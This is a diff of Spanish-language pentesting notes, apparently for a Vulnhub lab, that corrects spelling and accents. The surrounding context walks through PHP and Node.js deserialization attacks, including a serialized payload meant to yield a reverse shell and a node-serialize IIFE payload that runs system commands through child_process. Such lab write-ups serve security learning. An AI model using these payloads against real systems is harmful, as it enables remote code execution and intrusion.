@@ -25,7 +25,7 @@ A continuación se os proporciona el enlace directo a la máquina de Vulnhub don
 * PHP Deserialization Attack
 * Se basa en objetos
 
-Interceptamos la peticion en BurpSuite
+Interceptamos la petición en BurpSuite
 ```bash
 ❯ obj=o%3A8%22pingTest%22%3A1%3A%7Bs%3A9%3A%22ipAddress%22%3Bs%3A14%3A%22192.168.68.110%22%3B%7D&ip=192.168.68.110 # Estructura del objeto original que viaja en formato serializado
 ❯ obj=o:8"pingTest":1:{s:9:"ipAddress";s:14:"192.168.68.110";}&ip=192.168.68.110       # La deserializamos 
@@ -33,7 +33,7 @@ Interceptamos la peticion en BurpSuite
 	# 9 = Tiene una string de 9 caracteres 'ipAddress' (s=string)
 	# 14 = Tiene una string de 14 caracteres '192.168.68.110' (s=string)
 ```
-Lo que hace el servidor es **Deserializar** e interpretar lo que estamos enviando en el objeto y con base lo que estamos enviando, se ejecute una funcion o un metodo.
+Lo que hace el servidor es **Deserializar** e interpretar lo que estamos enviando en el objeto y con base lo que estamos enviando, se ejecute una función o un método.
 
 Empezando con el ataque, debemos de aprovecharnos de un campo para poder mandar la data serializada con nuestra ReverShell.
 ```php
@@ -53,7 +53,7 @@ Para poder ver la data serializada en la consola:
 ❯ php serialized.php 2>/dev/null; echo 
 ```
 
-Pegamos el resultado comnop se muesra a continuacion y lo mandamos por BurpSuite
+Pegamos el resultado cómo se muestra a continuación y lo mandamos por BurpSuite
 ```bash
 ❯ obj=RU5LCoMwFLzKIxTdtImxVuxHpXeQrrKJSaiB0AZf4ka8ewOFFgYGhvmtZJEuGnIht95PHpSTiODt6zkYDKuPo7MKdtbftZ4NYivIdZQ4wUHlX7bQZSCYNotgwSjB-LmkvG5oAueFYFV1hKLLeJ6i8CvEh3RWt8MczV99x-BjSBvJuvUdkD1Z0rWGlvREtg8%2C&v&ip=192.168.68.110  # Pegamos la data serializada, para que al momento de mandarla a la maquina victima la deserialice y la interprete y asi podamos tener una ReverShell
 ```
@@ -63,9 +63,9 @@ Pegamos el resultado comnop se muesra a continuacion y lo mandamos por BurpSuite
 * Node Js Deserialization Attack
 * [NodeJs-Deserialization attack](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/) para podernos montar un servicio por el puerto 3000 y practicar 
 
-En este caso la data que se esta enviando esta serializada, primero en urlencode y despues en base64
+En este caso la data que se esta enviando esta serializada, primero en urlencode y después en base64
 
-* Funcion que nos ayudara a serializar algo que le pasemos.
+* Función que nos ayudara a serializar algo que le pasemos.
 ```bash
 ❯ serilaized.js                    # Original 
 	var y = {
@@ -79,7 +79,7 @@ En este caso la data que se esta enviando esta serializada, primero en urlencode
 
 **IIFE (Inmediatly Invoked Function Expression)** que nos permite  invocar o hacer la llamada inmediatamente. 
 
-Podemos colcar unos **()** antes de la coma y ahi podriamos hacer que no llegue a la parte de serializacion y ejecute antes el comando
+Podemos colcar unos **()** antes de la coma y ahí podríamos hacer que no llegue a la parte de serialización y ejecute antes el comando
 ```bash
 ❯ serilaized.js                   # Debemos de colocarle el IIFE para que nos ejecute el comando 
 	var y = {
@@ -100,14 +100,14 @@ Para poder ver la data serializada del comando anterior en la consola:
 ```
 
 
-* Funcion para deserializar la data
+* Función para deserializar la data
 ```bash
 ❯ unserilaized.js                   # Original 
 	var serialize = require('node-serialize');
 	var payload = '{"rce":"_$$ND_FUNC$$_function(){\n require('child_process').exec('id', function(error, stdout, stderr) {console.log(stdout) });\n }"}';
 	serialize.unserialize(payload);
 ```
-En Payload debemos de cargar la data serializada, para que esta funcion me la pueda deserializar. 
+En Payload debemos de cargar la data serializada, para que esta función me la pueda deserializar. 
 
 ```bash
 ❯ unserilaized.js                   # Debemos de colocarle el IIFE para que nos ejecute el comando y modificandolo 
@@ -124,7 +124,7 @@ En la pagina podemos descargar la herramienta para podernos generar una ReverShe
 	# Port = Nuestro puerto de atacante
 ```
 
-El resultado lo debemos de colocar ahi:
+El resultado lo debemos de colocar ahí:
 ```bash     
 ❯ nvim data                  # Debemos de colocarle el IIFE para que nos ejecute el comando
 	{"rce":"_$$ND_FUNC$$_function(){resultado del comando anterior}()"}
